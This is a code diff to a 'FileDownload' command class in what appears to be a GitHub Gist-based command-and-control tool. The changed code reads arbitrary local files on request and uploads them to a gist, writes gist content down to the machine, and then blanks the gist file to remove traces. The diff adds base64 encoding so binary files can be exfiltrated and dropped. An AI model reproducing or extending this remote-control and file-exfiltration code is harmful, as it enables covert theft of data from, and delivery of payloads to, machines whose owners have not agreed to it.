@@ -1,3 +1,4 @@
+import base64
 import subprocess
 from datetime import datetime
 import time
@@ -132,8 +133,8 @@ class FileDownload(Command):
 
         name = f"downloaded-{datetime.now()}"
         gist.update()
-        with open(name, "w") as f:
-            f.write(gist.files[get_filename_from_path(path)].content)
+        with open(name, "wb") as f:
+            f.write(base64.b64decode(gist.files[get_filename_from_path(path)].content.encode("ascii")))
 
         gist.edit(files={get_filename_from_path(path): InputFileContent("")})  # DELETE
         gist.create_comment(self.DELETE_RESPONSE)
@@ -143,14 +144,14 @@ class FileDownload(Command):
         print("Upload file ")
         path = comment[len(name) + len(self.REQUEST):]
         print(f"path is {path}")
-        with opened_w_error(path, "r") as (file, err):
+        with opened_w_error(path, "rb") as (file, err):
             if err:
                 print(f"failing {err}")
                 return gist.create_comment(self.FAIL_RESP).id
             else:
                 content = file.read()
 
-        files = {get_filename_from_path(path): InputFileContent(content)}
+        files = {get_filename_from_path(path): InputFileContent(base64.b64encode(content).decode("ascii"))}
         gist.edit(files=files)
         return gist.create_comment(self.RESPONSE).id
 
